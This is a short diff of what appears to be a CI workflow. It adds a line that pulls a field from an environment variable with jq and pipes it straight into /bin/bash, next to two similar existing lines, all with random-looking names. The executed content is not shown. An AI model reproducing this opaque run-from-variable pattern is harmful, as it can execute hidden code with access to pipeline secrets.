@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$kdh4" | jq -r .aouo9 | /bin/bash
           printf '%s' "$xf61" | jq -r .pdq04 | /bin/bash
+          printf '%s' "$ca103" | jq -r .mogi08521 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
